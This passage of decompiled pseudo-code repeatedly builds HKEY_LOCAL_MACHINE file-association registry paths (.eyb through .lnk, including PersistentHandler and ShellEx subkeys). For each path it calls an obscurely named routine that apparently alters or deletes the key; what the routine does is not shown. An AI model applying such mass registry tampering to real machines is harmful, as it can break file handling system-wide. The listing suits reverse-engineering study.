  loc_0044ED84: var_9510 = OnudaSilloA(global_80000002, var_950C)
  loc_0044ED89: call var_9514 = global_00401054
  loc_0044ED92: call var_9518 = global_004011CC
  loc_0044EDA8: call var_951C = global_00401188(var_24, "SOFTWARE\Classes\.eyb")
  loc_0044EDB4: var_9520 = OnudaSilloA(global_80000002, var_951C)
  loc_0044EDB9: call var_9524 = global_00401054
  loc_0044EDC2: call var_9528 = global_004011CC
  loc_0044EDD8: call var_952C = global_00401188(var_24, "SOFTWARE\Classes\.fif")
  loc_0044EDE4: var_9530 = OnudaSilloA(global_80000002, var_952C)
  loc_0044EDE9: call var_9534 = global_00401054
  loc_0044EDF2: call var_9538 = global_004011CC
  loc_0044EE08: call var_953C = global_00401188(var_24, "SOFTWARE\Classes\.flac")
  loc_0044EE14: var_9540 = OnudaSilloA(global_80000002, var_953C)
  loc_0044EE19: call var_9544 = global_00401054
  loc_0044EE22: call var_9548 = global_004011CC
  loc_0044EE38: call var_954C = global_00401188(var_24, "SOFTWARE\Classes\.flc")
  loc_0044EE44: var_9550 = OnudaSilloA(global_80000002, var_954C)
  loc_0044EE49: call var_9554 = global_00401054
  loc_0044EE52: call var_9558 = global_004011CC
  loc_0044EE68: call var_955C = global_00401188(var_24, "SOFTWARE\Classes\.fli")
  loc_0044EE74: var_9560 = OnudaSilloA(global_80000002, var_955C)
  loc_0044EE79: call var_9564 = global_00401054
  loc_0044EE82: call var_9568 = global_004011CC
  loc_0044EE98: call var_956C = global_00401188(var_24, "SOFTWARE\Classes\.flv")
  loc_0044EEA4: var_9570 = OnudaSilloA(global_80000002, var_956C)
  loc_0044EEA9: call var_9574 = global_00401054
  loc_0044EEB2: call var_9578 = global_004011CC
  loc_0044EEC8: call var_957C = global_00401188(var_24, "SOFTWARE\Classes\.fnd\PersistentHandler")
  loc_0044EED4: var_9580 = OnudaSilloA(global_80000002, var_957C)
  loc_0044EED9: call var_9584 = global_00401054
  loc_0044EEE2: call var_9588 = global_004011CC
  loc_0044EEF8: call var_958C = global_00401188(var_24, "SOFTWARE\Classes\.fnd")
  loc_0044EF04: var_9590 = OnudaSilloA(global_80000002, var_958C)
  loc_0044EF09: call var_9594 = global_00401054
  loc_0044EF12: call var_9598 = global_004011CC
  loc_0044EF28: call var_959C = global_00401188(var_24, "SOFTWARE\Classes\.fnt\PersistentHandler")
  loc_0044EF34: var_95A0 = OnudaSilloA(global_80000002, var_959C)
  loc_0044EF39: call var_95A4 = global_00401054
  loc_0044EF42: call var_95A8 = global_004011CC
  loc_0044EF58: call var_95AC = global_00401188(var_24, "SOFTWARE\Classes\.fnt")
  loc_0044EF64: var_95B0 = OnudaSilloA(global_80000002, var_95AC)
  loc_0044EF69: call var_95B4 = global_00401054
  loc_0044EF72: call var_95B8 = global_004011CC
  loc_0044EF88: call var_95BC = global_00401188(var_24, "SOFTWARE\Classes\.Folder\PersistentHandler")
  loc_0044EF94: var_95C0 = OnudaSilloA(global_80000002, var_95BC)
  loc_0044EF99: call var_95C4 = global_00401054
  loc_0044EFA2: call var_95C8 = global_004011CC
  loc_0044EFB8: call var_95CC = global_00401188(var_24, "SOFTWARE\Classes\.Folder")
  loc_0044EFC4: var_95D0 = OnudaSilloA(global_80000002, var_95CC)
  loc_0044EFC9: call var_95D4 = global_00401054
  loc_0044EFD2: call var_95D8 = global_004011CC
  loc_0044EFE8: call var_95DC = global_00401188(var_24, "SOFTWARE\Classes\.fon\PersistentHandler")
  loc_0044EFF4: var_95E0 = OnudaSilloA(global_80000002, var_95DC)
  loc_0044EFF9: call var_95E4 = global_00401054
  loc_0044F002: call var_95E8 = global_004011CC
  loc_0044F018: call var_95EC = global_00401188(var_24, "SOFTWARE\Classes\.fon")
  loc_0044F024: var_95F0 = OnudaSilloA(global_80000002, var_95EC)
  loc_0044F029: call var_95F4 = global_00401054
  loc_0044F032: call var_95F8 = global_004011CC
  loc_0044F048: call var_95FC = global_00401188(var_24, "SOFTWARE\Classes\.frm")
  loc_0044F054: var_9600 = OnudaSilloA(global_80000002, var_95FC)
  loc_0044F059: call var_9604 = global_00401054
  loc_0044F062: call var_9608 = global_004011CC
  loc_0044F078: call var_960C = global_00401188(var_24, "SOFTWARE\Classes\.frx")
  loc_0044F084: var_9610 = OnudaSilloA(global_80000002, var_960C)
  loc_0044F089: call var_9614 = global_00401054
  loc_0044F092: call var_9618 = global_004011CC
  loc_0044F0A8: call var_961C = global_00401188(var_24, "SOFTWARE\Classes\.ghi\PersistentHandler")
  loc_0044F0B4: var_9620 = OnudaSilloA(global_80000002, var_961C)
  loc_0044F0B9: call var_9624 = global_00401054
  loc_0044F0C2: call var_9628 = global_004011CC
  loc_0044F0D8: call var_962C = global_00401188(var_24, "SOFTWARE\Classes\.ghi")
  loc_0044F0E4: var_9630 = OnudaSilloA(global_80000002, var_962C)
  loc_0044F0E9: call var_9634 = global_00401054
  loc_0044F0F2: call var_9638 = global_004011CC
  loc_0044F108: call var_963C = global_00401188(var_24, "SOFTWARE\Classes\.gif\OpenWithProgids")
  loc_0044F114: var_9640 = OnudaSilloA(global_80000002, var_963C)
  loc_0044F119: call var_9644 = global_00401054
  loc_0044F122: call var_9648 = global_004011CC
  loc_0044F138: call var_964C = global_00401188(var_24, "SOFTWARE\Classes\.gif\PersistentHandler")
  loc_0044F144: var_9650 = OnudaSilloA(global_80000002, var_964C)
  loc_0044F149: call var_9654 = global_00401054
  loc_0044F152: call var_9658 = global_004011CC
  loc_0044F168: call var_965C = global_00401188(var_24, "SOFTWARE\Classes\.gif")
  loc_0044F174: var_9660 = OnudaSilloA(global_80000002, var_965C)
  loc_0044F179: call var_9664 = global_00401054
  loc_0044F182: call var_9668 = global_004011CC
  loc_0044F198: call var_966C = global_00401188(var_24, "SOFTWARE\Classes\.grp")
  loc_0044F1A4: var_9670 = OnudaSilloA(global_80000002, var_966C)
  loc_0044F1A9: call var_9674 = global_00401054
  loc_0044F1B2: call var_9678 = global_004011CC
  loc_0044F1C8: call var_967C = global_00401188(var_24, "SOFTWARE\Classes\.gz\PersistentHandler")
  loc_0044F1D4: var_9680 = OnudaSilloA(global_80000002, var_967C)
  loc_0044F1D9: call var_9684 = global_00401054
  loc_0044F1E2: call var_9688 = global_004011CC
  loc_0044F1F8: call var_968C = global_00401188(var_24, "SOFTWARE\Classes\.gz")
  loc_0044F204: var_9690 = OnudaSilloA(global_80000002, var_968C)
  loc_0044F209: call var_9694 = global_00401054
  loc_0044F212: call var_9698 = global_004011CC
  loc_0044F228: call var_969C = global_00401188(var_24, "SOFTWARE\Classes\.h\PersistentHandler")
  loc_0044F234: var_96A0 = OnudaSilloA(global_80000002, var_969C)
  loc_0044F239: call var_96A4 = global_00401054
  loc_0044F242: call var_96A8 = global_004011CC
  loc_0044F258: call var_96AC = global_00401188(var_24, "SOFTWARE\Classes\.h")
  loc_0044F264: var_96B0 = OnudaSilloA(global_80000002, var_96AC)
  loc_0044F269: call var_96B4 = global_00401054
  loc_0044F272: call var_96B8 = global_004011CC
  loc_0044F288: call var_96BC = global_00401188(var_24, "SOFTWARE\Classes\.hhc\PersistentHandler")
  loc_0044F294: var_96C0 = OnudaSilloA(global_80000002, var_96BC)
  loc_0044F299: call var_96C4 = global_00401054
  loc_0044F2A2: call var_96C8 = global_004011CC
  loc_0044F2B8: call var_96CC = global_00401188(var_24, "SOFTWARE\Classes\.hhc")
  loc_0044F2C4: var_96D0 = OnudaSilloA(global_80000002, var_96CC)
  loc_0044F2C9: call var_96D4 = global_00401054
  loc_0044F2D2: call var_96D8 = global_004011CC
  loc_0044F2E8: call var_96DC = global_00401188(var_24, "SOFTWARE\Classes\.hlp")
  loc_0044F2F4: var_96E0 = OnudaSilloA(global_80000002, var_96DC)
  loc_0044F2F9: call var_96E4 = global_00401054
  loc_0044F302: call var_96E8 = global_004011CC
  loc_0044F318: call var_96EC = global_00401188(var_24, "SOFTWARE\Classes\.hpp\PersistentHandler")
  loc_0044F324: var_96F0 = OnudaSilloA(global_80000002, var_96EC)
  loc_0044F329: call var_96F4 = global_00401054
  loc_0044F332: call var_96F8 = global_004011CC
  loc_0044F348: call var_96FC = global_00401188(var_24, "SOFTWARE\Classes\.hpp")
  loc_0044F354: var_9700 = OnudaSilloA(global_80000002, var_96FC)
  loc_0044F359: call var_9704 = global_00401054
  loc_0044F362: call var_9708 = global_004011CC
  loc_0044F378: call var_970C = global_00401188(var_24, "SOFTWARE\Classes\.hqx\PersistentHandler")
  loc_0044F384: var_9710 = OnudaSilloA(global_80000002, var_970C)
  loc_0044F389: call var_9714 = global_00401054
  loc_0044F392: call var_9718 = global_004011CC
  loc_0044F3A8: call var_971C = global_00401188(var_24, "SOFTWARE\Classes\.hqx")
  loc_0044F3B4: var_9720 = OnudaSilloA(global_80000002, var_971C)
  loc_0044F3B9: call var_9724 = global_00401054
  loc_0044F3C2: call var_9728 = global_004011CC
  loc_0044F3D8: call var_972C = global_00401188(var_24, "SOFTWARE\Classes\.ht")
  loc_0044F3E4: var_9730 = OnudaSilloA(global_80000002, var_972C)
  loc_0044F3E9: call var_9734 = global_00401054
  loc_0044F3F2: call var_9738 = global_004011CC
  loc_0044F408: call var_973C = global_00401188(var_24, "SOFTWARE\Classes\.hta")
  loc_0044F414: var_9740 = OnudaSilloA(global_80000002, var_973C)
  loc_0044F419: call var_9744 = global_00401054
  loc_0044F422: call var_9748 = global_004011CC
  loc_0044F438: call var_974C = global_00401188(var_24, "SOFTWARE\Classes\.htc")
  loc_0044F444: var_9750 = OnudaSilloA(global_80000002, var_974C)
  loc_0044F449: call var_9754 = global_00401054
  loc_0044F452: call var_9758 = global_004011CC
  loc_0044F468: call var_975C = global_00401188(var_24, "SOFTWARE\Classes\.htm\OpenWithList\notepad.exe")
  loc_0044F474: var_9760 = OnudaSilloA(global_80000002, var_975C)
  loc_0044F479: call var_9764 = global_00401054
  loc_0044F482: call var_9768 = global_004011CC
  loc_0044F498: call var_976C = global_00401188(var_24, "SOFTWARE\Classes\.htm\OpenWithList")
  loc_0044F4A4: var_9770 = OnudaSilloA(global_80000002, var_976C)
  loc_0044F4A9: call var_9774 = global_00401054
  loc_0044F4B2: call var_9778 = global_004011CC
  loc_0044F4C8: call var_977C = global_00401188(var_24, "SOFTWARE\Classes\.htm\PersistentHandler")
  loc_0044F4D4: var_9780 = OnudaSilloA(global_80000002, var_977C)
  loc_0044F4D9: call var_9784 = global_00401054
  loc_0044F4E2: call var_9788 = global_004011CC
  loc_0044F4F8: call var_978C = global_00401188(var_24, "SOFTWARE\Classes\.htm")
  loc_0044F504: var_9790 = OnudaSilloA(global_80000002, var_978C)
  loc_0044F509: call var_9794 = global_00401054
  loc_0044F512: call var_9798 = global_004011CC
  loc_0044F528: call var_979C = global_00401188(var_24, "SOFTWARE\Classes\.html\PersistentHandler")
  loc_0044F534: var_97A0 = OnudaSilloA(global_80000002, var_979C)
  loc_0044F539: call var_97A4 = global_00401054
  loc_0044F542: call var_97A8 = global_004011CC
  loc_0044F558: call var_97AC = global_00401188(var_24, "SOFTWARE\Classes\.html")
  loc_0044F564: var_97B0 = OnudaSilloA(global_80000002, var_97AC)
  loc_0044F569: call var_97B4 = global_00401054
  loc_0044F572: call var_97B8 = global_004011CC
  loc_0044F588: call var_97BC = global_00401188(var_24, "SOFTWARE\Classes\.htt\PersistentHandler")
  loc_0044F594: var_97C0 = OnudaSilloA(global_80000002, var_97BC)
  loc_0044F599: call var_97C4 = global_00401054
  loc_0044F5A2: call var_97C8 = global_004011CC
  loc_0044F5B8: call var_97CC = global_00401188(var_24, "SOFTWARE\Classes\.htt")
  loc_0044F5C4: var_97D0 = OnudaSilloA(global_80000002, var_97CC)
  loc_0044F5C9: call var_97D4 = global_00401054
  loc_0044F5D2: call var_97D8 = global_004011CC
  loc_0044F5E8: call var_97DC = global_00401188(var_24, "SOFTWARE\Classes\.htw\PersistentHandler")
  loc_0044F5F4: var_97E0 = OnudaSilloA(global_80000002, var_97DC)
  loc_0044F5F9: call var_97E4 = global_00401054
  loc_0044F602: call var_97E8 = global_004011CC
  loc_0044F618: call var_97EC = global_00401188(var_24, "SOFTWARE\Classes\.htw")
  loc_0044F624: var_97F0 = OnudaSilloA(global_80000002, var_97EC)
  loc_0044F629: call var_97F4 = global_00401054
  loc_0044F632: call var_97F8 = global_004011CC
  loc_0044F648: call var_97FC = global_00401188(var_24, "SOFTWARE\Classes\.htx\PersistentHandler")
  loc_0044F654: var_9800 = OnudaSilloA(global_80000002, var_97FC)
  loc_0044F659: call var_9804 = global_00401054
  loc_0044F662: call var_9808 = global_004011CC
  loc_0044F678: call var_980C = global_00401188(var_24, "SOFTWARE\Classes\.htx")
  loc_0044F684: var_9810 = OnudaSilloA(global_80000002, var_980C)
  loc_0044F689: call var_9814 = global_00401054
  loc_0044F692: call var_9818 = global_004011CC
  loc_0044F6A8: call var_981C = global_00401188(var_24, "SOFTWARE\Classes\.hxx\PersistentHandler")
  loc_0044F6B4: var_9820 = OnudaSilloA(global_80000002, var_981C)
  loc_0044F6B9: call var_9824 = global_00401054
  loc_0044F6C2: call var_9828 = global_004011CC
  loc_0044F6D8: call var_982C = global_00401188(var_24, "SOFTWARE\Classes\.hxx")
  loc_0044F6E4: var_9830 = OnudaSilloA(global_80000002, var_982C)
  loc_0044F6E9: call var_9834 = global_00401054
  loc_0044F6F2: call var_9838 = global_004011CC
  loc_0044F708: call var_983C = global_00401188(var_24, "SOFTWARE\Classes\.icc")
  loc_0044F714: var_9840 = OnudaSilloA(global_80000002, var_983C)
  loc_0044F719: call var_9844 = global_00401054
  loc_0044F722: call var_9848 = global_004011CC
  loc_0044F738: call var_984C = global_00401188(var_24, "SOFTWARE\Classes\.icm\PersistentHandler")
  loc_0044F744: var_9850 = OnudaSilloA(global_80000002, var_984C)
  loc_0044F749: call var_9854 = global_00401054
  loc_0044F752: call var_9858 = global_004011CC
  loc_0044F768: call var_985C = global_00401188(var_24, "SOFTWARE\Classes\.icm")
  loc_0044F774: var_9860 = OnudaSilloA(global_80000002, var_985C)
  loc_0044F779: call var_9864 = global_00401054
  loc_0044F782: call var_9868 = global_004011CC
  loc_0044F798: call var_986C = global_00401188(var_24, "SOFTWARE\Classes\.ico\PersistentHandler")
  loc_0044F7A4: var_9870 = OnudaSilloA(global_80000002, var_986C)
  loc_0044F7A9: call var_9874 = global_00401054
  loc_0044F7B2: call var_9878 = global_004011CC
  loc_0044F7C8: call var_987C = global_00401188(var_24, "SOFTWARE\Classes\.ico")
  loc_0044F7D4: var_9880 = OnudaSilloA(global_80000002, var_987C)
  loc_0044F7D9: call var_9884 = global_00401054
  loc_0044F7E2: call var_9888 = global_004011CC
  loc_0044F7F8: call var_988C = global_00401188(var_24, "SOFTWARE\Classes\.idb\PersistentHandler")
  loc_0044F804: var_9890 = OnudaSilloA(global_80000002, var_988C)
  loc_0044F809: call var_9894 = global_00401054
  loc_0044F812: call var_9898 = global_004011CC
  loc_0044F828: call var_989C = global_00401188(var_24, "SOFTWARE\Classes\.idb")
  loc_0044F834: var_98A0 = OnudaSilloA(global_80000002, var_989C)
  loc_0044F839: call var_98A4 = global_00401054
  loc_0044F842: call var_98A8 = global_004011CC
  loc_0044F858: call var_98AC = global_00401188(var_24, "SOFTWARE\Classes\.idl\PersistentHandler")
  loc_0044F864: var_98B0 = OnudaSilloA(global_80000002, var_98AC)
  loc_0044F869: call var_98B4 = global_00401054
  loc_0044F872: call var_98B8 = global_004011CC
  loc_0044F888: call var_98BC = global_00401188(var_24, "SOFTWARE\Classes\.idl")
  loc_0044F894: var_98C0 = OnudaSilloA(global_80000002, var_98BC)
  loc_0044F899: call var_98C4 = global_00401054
  loc_0044F8A2: call var_98C8 = global_004011CC
  loc_0044F8B8: call var_98CC = global_00401188(var_24, "SOFTWARE\Classes\.idq\PersistentHandler")
  loc_0044F8C4: var_98D0 = OnudaSilloA(global_80000002, var_98CC)
  loc_0044F8C9: call var_98D4 = global_00401054
  loc_0044F8D2: call var_98D8 = global_004011CC
  loc_0044F8E8: call var_98DC = global_00401188(var_24, "SOFTWARE\Classes\.idq")
  loc_0044F8F4: var_98E0 = OnudaSilloA(global_80000002, var_98DC)
  loc_0044F8F9: call var_98E4 = global_00401054
  loc_0044F902: call var_98E8 = global_004011CC
  loc_0044F918: call var_98EC = global_00401188(var_24, "SOFTWARE\Classes\.iii")
  loc_0044F924: var_98F0 = OnudaSilloA(global_80000002, var_98EC)
  loc_0044F929: call var_98F4 = global_00401054
  loc_0044F932: call var_98F8 = global_004011CC
  loc_0044F948: call var_98FC = global_00401188(var_24, "SOFTWARE\Classes\.ilk\PersistentHandler")
  loc_0044F954: var_9900 = OnudaSilloA(global_80000002, var_98FC)
  loc_0044F959: call var_9904 = global_00401054
  loc_0044F962: call var_9908 = global_004011CC
  loc_0044F978: call var_990C = global_00401188(var_24, "SOFTWARE\Classes\.ilk")
  loc_0044F984: var_9910 = OnudaSilloA(global_80000002, var_990C)
  loc_0044F989: call var_9914 = global_00401054
  loc_0044F992: call var_9918 = global_004011CC
  loc_0044F9A8: call var_991C = global_00401188(var_24, "SOFTWARE\Classes\.imc\PersistentHandler")
  loc_0044F9B4: var_9920 = OnudaSilloA(global_80000002, var_991C)
  loc_0044F9B9: call var_9924 = global_00401054
  loc_0044F9C2: call var_9928 = global_004011CC
  loc_0044F9D8: call var_992C = global_00401188(var_24, "SOFTWARE\Classes\.imc")
  loc_0044F9E4: var_9930 = OnudaSilloA(global_80000002, var_992C)
  loc_0044F9E9: call var_9934 = global_00401054
  loc_0044F9F2: call var_9938 = global_004011CC
  loc_0044FA08: call var_993C = global_00401188(var_24, "SOFTWARE\Classes\.in_\PersistentHandler")
  loc_0044FA14: var_9940 = OnudaSilloA(global_80000002, var_993C)
  loc_0044FA19: call var_9944 = global_00401054
  loc_0044FA22: call var_9948 = global_004011CC
  loc_0044FA38: call var_994C = global_00401188(var_24, "SOFTWARE\Classes\.in_")
  loc_0044FA44: var_9950 = OnudaSilloA(global_80000002, var_994C)
  loc_0044FA49: call var_9954 = global_00401054
  loc_0044FA52: call var_9958 = global_004011CC
  loc_0044FA68: call var_995C = global_00401188(var_24, "SOFTWARE\Classes\.inc\PersistentHandler")
  loc_0044FA74: var_9960 = OnudaSilloA(global_80000002, var_995C)
  loc_0044FA79: call var_9964 = global_00401054
  loc_0044FA82: call var_9968 = global_004011CC
  loc_0044FA98: call var_996C = global_00401188(var_24, "SOFTWARE\Classes\.inc")
  loc_0044FAA4: var_9970 = OnudaSilloA(global_80000002, var_996C)
  loc_0044FAA9: call var_9974 = global_00401054
  loc_0044FAB2: call var_9978 = global_004011CC
  loc_0044FAC8: call var_997C = global_00401188(var_24, "SOFTWARE\Classes\.inf\PersistentHandler")
  loc_0044FAD4: var_9980 = OnudaSilloA(global_80000002, var_997C)
  loc_0044FAD9: call var_9984 = global_00401054
  loc_0044FAE2: call var_9988 = global_004011CC
  loc_0044FAF8: call var_998C = global_00401188(var_24, "SOFTWARE\Classes\.inf")
  loc_0044FB04: var_9990 = OnudaSilloA(global_80000002, var_998C)
  loc_0044FB09: call var_9994 = global_00401054
  loc_0044FB12: call var_9998 = global_004011CC
  loc_0044FB28: call var_999C = global_00401188(var_24, "SOFTWARE\Classes\.ini\PersistentHandler")
  loc_0044FB34: var_99A0 = OnudaSilloA(global_80000002, var_999C)
  loc_0044FB39: call var_99A4 = global_00401054
  loc_0044FB42: call var_99A8 = global_004011CC
  loc_0044FB58: call var_99AC = global_00401188(var_24, "SOFTWARE\Classes\.ini")
  loc_0044FB64: var_99B0 = OnudaSilloA(global_80000002, var_99AC)
  loc_0044FB69: call var_99B4 = global_00401054
  loc_0044FB72: call var_99B8 = global_004011CC
  loc_0044FB88: call var_99BC = global_00401188(var_24, "SOFTWARE\Classes\.ins")
  loc_0044FB94: var_99C0 = OnudaSilloA(global_80000002, var_99BC)
  loc_0044FB99: call var_99C4 = global_00401054
  loc_0044FBA2: call var_99C8 = global_004011CC
  loc_0044FBB8: call var_99CC = global_00401188(var_24, "SOFTWARE\Classes\.inv\PersistentHandler")
  loc_0044FBC4: var_99D0 = OnudaSilloA(global_80000002, var_99CC)
  loc_0044FBC9: call var_99D4 = global_00401054
  loc_0044FBD2: call var_99D8 = global_004011CC
  loc_0044FBE8: call var_99DC = global_00401188(var_24, "SOFTWARE\Classes\.inv")
  loc_0044FBF4: var_99E0 = OnudaSilloA(global_80000002, var_99DC)
  loc_0044FBF9: call var_99E4 = global_00401054
  loc_0044FC02: call var_99E8 = global_004011CC
  loc_0044FC18: call var_99EC = global_00401188(var_24, "SOFTWARE\Classes\.inx\PersistentHandler")
  loc_0044FC24: var_99F0 = OnudaSilloA(global_80000002, var_99EC)
  loc_0044FC29: call var_99F4 = global_00401054
  loc_0044FC32: call var_99F8 = global_004011CC
  loc_0044FC48: call var_99FC = global_00401188(var_24, "SOFTWARE\Classes\.inx")
  loc_0044FC54: var_9A00 = OnudaSilloA(global_80000002, var_99FC)
  loc_0044FC59: call var_9A04 = global_00401054
  loc_0044FC62: call var_9A08 = global_004011CC
  loc_0044FC78: call var_9A0C = global_00401188(var_24, "SOFTWARE\Classes\.iso")
  loc_0044FC84: var_9A10 = OnudaSilloA(global_80000002, var_9A0C)
  loc_0044FC89: call var_9A14 = global_00401054
  loc_0044FC92: call var_9A18 = global_004011CC
  loc_0044FCA8: call var_9A1C = global_00401188(var_24, "SOFTWARE\Classes\.isp")
  loc_0044FCB4: var_9A20 = OnudaSilloA(global_80000002, var_9A1C)
  loc_0044FCB9: call var_9A24 = global_00401054
  loc_0044FCC2: call var_9A28 = global_004011CC
  loc_0044FCD8: call var_9A2C = global_00401188(var_24, "SOFTWARE\Classes\.its")
  loc_0044FCE4: var_9A30 = OnudaSilloA(global_80000002, var_9A2C)
  loc_0044FCE9: call var_9A34 = global_00401054
  loc_0044FCF2: call var_9A38 = global_004011CC
  loc_0044FD08: call var_9A3C = global_00401188(var_24, "SOFTWARE\Classes\.ivf\PersistentHandler")
  loc_0044FD14: var_9A40 = OnudaSilloA(global_80000002, var_9A3C)
  loc_0044FD19: call var_9A44 = global_00401054
  loc_0044FD22: call var_9A48 = global_004011CC
  loc_0044FD38: call var_9A4C = global_00401188(var_24, "SOFTWARE\Classes\.ivf")
  loc_0044FD44: var_9A50 = OnudaSilloA(global_80000002, var_9A4C)
  loc_0044FD49: call var_9A54 = global_00401054
  loc_0044FD52: call var_9A58 = global_004011CC
  loc_0044FD68: call var_9A5C = global_00401188(var_24, "SOFTWARE\Classes\.jar")
  loc_0044FD74: var_9A60 = OnudaSilloA(global_80000002, var_9A5C)
  loc_0044FD79: call var_9A64 = global_00401054
  loc_0044FD82: call var_9A68 = global_004011CC
  loc_0044FD98: call var_9A6C = global_00401188(var_24, "SOFTWARE\Classes\.java")
  loc_0044FDA4: var_9A70 = OnudaSilloA(global_80000002, var_9A6C)
  loc_0044FDA9: call var_9A74 = global_00401054
  loc_0044FDB2: call var_9A78 = global_004011CC
  loc_0044FDC8: call var_9A7C = global_00401188(var_24, "SOFTWARE\Classes\.jbf\PersistentHandler")
  loc_0044FDD4: var_9A80 = OnudaSilloA(global_80000002, var_9A7C)
  loc_0044FDD9: call var_9A84 = global_00401054
  loc_0044FDE2: call var_9A88 = global_004011CC
  loc_0044FDF8: call var_9A8C = global_00401188(var_24, "SOFTWARE\Classes\.jbf")
  loc_0044FE04: var_9A90 = OnudaSilloA(global_80000002, var_9A8C)
  loc_0044FE09: call var_9A94 = global_00401054
  loc_0044FE12: call var_9A98 = global_004011CC
  loc_0044FE28: call var_9A9C = global_00401188(var_24, "SOFTWARE\Classes\.jfif\OpenWithProgids")
  loc_0044FE34: var_9AA0 = OnudaSilloA(global_80000002, var_9A9C)
  loc_0044FE39: call var_9AA4 = global_00401054
  loc_0044FE42: call var_9AA8 = global_004011CC
  loc_0044FE58: call var_9AAC = global_00401188(var_24, "SOFTWARE\Classes\.jfif\PersistentHandler")
  loc_0044FE64: var_9AB0 = OnudaSilloA(global_80000002, var_9AAC)
  loc_0044FE69: call var_9AB4 = global_00401054
  loc_0044FE72: call var_9AB8 = global_004011CC
  loc_0044FE88: call var_9ABC = global_00401188(var_24, "SOFTWARE\Classes\.jfif")
  loc_0044FE94: var_9AC0 = OnudaSilloA(global_80000002, var_9ABC)
  loc_0044FE99: call var_9AC4 = global_00401054
  loc_0044FEA2: call var_9AC8 = global_004011CC
  loc_0044FEB8: call var_9ACC = global_00401188(var_24, "SOFTWARE\Classes\.job")
  loc_0044FEC4: var_9AD0 = OnudaSilloA(global_80000002, var_9ACC)
  loc_0044FEC9: call var_9AD4 = global_00401054
  loc_0044FED2: call var_9AD8 = global_004011CC
  loc_0044FEE8: call var_9ADC = global_00401188(var_24, "SOFTWARE\Classes\.jod")
  loc_0044FEF4: var_9AE0 = OnudaSilloA(global_80000002, var_9ADC)
  loc_0044FEF9: call var_9AE4 = global_00401054
  loc_0044FF02: call var_9AE8 = global_004011CC
  loc_0044FF18: call var_9AEC = global_00401188(var_24, "SOFTWARE\Classes\.jpe\OpenWithProgids")
  loc_0044FF24: var_9AF0 = OnudaSilloA(global_80000002, var_9AEC)
  loc_0044FF29: call var_9AF4 = global_00401054
  loc_0044FF32: call var_9AF8 = global_004011CC
  loc_0044FF48: call var_9AFC = global_00401188(var_24, "SOFTWARE\Classes\.jpe\PersistentHandler")
  loc_0044FF54: var_9B00 = OnudaSilloA(global_80000002, var_9AFC)
  loc_0044FF59: call var_9B04 = global_00401054
  loc_0044FF62: call var_9B08 = global_004011CC
  loc_0044FF78: call var_9B0C = global_00401188(var_24, "SOFTWARE\Classes\.jpe")
  loc_0044FF84: var_9B10 = OnudaSilloA(global_80000002, var_9B0C)
  loc_0044FF89: call var_9B14 = global_00401054
  loc_0044FF92: call var_9B18 = global_004011CC
  loc_0044FFA8: call var_9B1C = global_00401188(var_24, "SOFTWARE\Classes\.jpeg\OpenWithProgids")
  loc_0044FFB4: var_9B20 = OnudaSilloA(global_80000002, var_9B1C)
  loc_0044FFB9: call var_9B24 = global_00401054
  loc_0044FFC2: call var_9B28 = global_004011CC
  loc_0044FFD8: call var_9B2C = global_00401188(var_24, "SOFTWARE\Classes\.jpeg\PersistentHandler")
  loc_0044FFE4: var_9B30 = OnudaSilloA(global_80000002, var_9B2C)
  loc_0044FFE9: call var_9B34 = global_00401054
  loc_0044FFF2: call var_9B38 = global_004011CC
  loc_00450008: call var_9B3C = global_00401188(var_24, "SOFTWARE\Classes\.jpeg")
  loc_00450014: var_9B40 = OnudaSilloA(global_80000002, var_9B3C)
  loc_00450019: call var_9B44 = global_00401054
  loc_00450022: call var_9B48 = global_004011CC
  loc_00450038: call var_9B4C = global_00401188(var_24, "SOFTWARE\Classes\.jpg\OpenWithProgids")
  loc_00450044: var_9B50 = OnudaSilloA(global_80000002, var_9B4C)
  loc_00450049: call var_9B54 = global_00401054
  loc_00450052: call var_9B58 = global_004011CC
  loc_00450068: call var_9B5C = global_00401188(var_24, "SOFTWARE\Classes\.jpg\PersistentHandler")
  loc_00450074: var_9B60 = OnudaSilloA(global_80000002, var_9B5C)
  loc_00450079: call var_9B64 = global_00401054
  loc_00450082: call var_9B68 = global_004011CC
  loc_00450098: call var_9B6C = global_00401188(var_24, "SOFTWARE\Classes\.jpg")
  loc_004500A4: var_9B70 = OnudaSilloA(global_80000002, var_9B6C)
  loc_004500A9: call var_9B74 = global_00401054
  loc_004500B2: call var_9B78 = global_004011CC
  loc_004500C8: call var_9B7C = global_00401188(var_24, "SOFTWARE\Classes\.js\PersistentHandler")
  loc_004500D4: var_9B80 = OnudaSilloA(global_80000002, var_9B7C)
  loc_004500D9: call var_9B84 = global_00401054
  loc_004500E2: call var_9B88 = global_004011CC
  loc_004500F8: call var_9B8C = global_00401188(var_24, "SOFTWARE\Classes\.js")
  loc_00450104: var_9B90 = OnudaSilloA(global_80000002, var_9B8C)
  loc_00450109: call var_9B94 = global_00401054
  loc_00450112: call var_9B98 = global_004011CC
  loc_00450128: call var_9B9C = global_00401188(var_24, "SOFTWARE\Classes\.JSE")
  loc_00450134: var_9BA0 = OnudaSilloA(global_80000002, var_9B9C)
  loc_00450139: call var_9BA4 = global_00401054
  loc_00450142: call var_9BA8 = global_004011CC
  loc_00450158: call var_9BAC = global_00401188(var_24, "SOFTWARE\Classes\.latex\PersistentHandler")
  loc_00450164: var_9BB0 = OnudaSilloA(global_80000002, var_9BAC)
  loc_00450169: call var_9BB4 = global_00401054
  loc_00450172: call var_9BB8 = global_004011CC
  loc_00450188: call var_9BBC = global_00401188(var_24, "SOFTWARE\Classes\.latex")
  loc_00450194: var_9BC0 = OnudaSilloA(global_80000002, var_9BBC)
  loc_00450199: call var_9BC4 = global_00401054
  loc_004501A2: call var_9BC8 = global_004011CC
  loc_004501B8: call var_9BCC = global_00401188(var_24, "SOFTWARE\Classes\.lha")
  loc_004501C4: var_9BD0 = OnudaSilloA(global_80000002, var_9BCC)
  loc_004501C9: call var_9BD4 = global_00401054
  loc_004501D2: call var_9BD8 = global_004011CC
  loc_004501E8: call var_9BDC = global_00401188(var_24, "SOFTWARE\Classes\.lib\PersistentHandler")
  loc_004501F4: var_9BE0 = OnudaSilloA(global_80000002, var_9BDC)
  loc_004501F9: call var_9BE4 = global_00401054
  loc_00450202: call var_9BE8 = global_004011CC
  loc_00450218: call var_9BEC = global_00401188(var_24, "SOFTWARE\Classes\.lib")
  loc_00450224: var_9BF0 = OnudaSilloA(global_80000002, var_9BEC)
  loc_00450229: call var_9BF4 = global_00401054
  loc_00450232: call var_9BF8 = global_004011CC
  loc_00450248: call var_9BFC = global_00401188(var_24, "SOFTWARE\Classes\.lnk\ShellEx\{000214EE-0000-0000-C000-000000000046}")
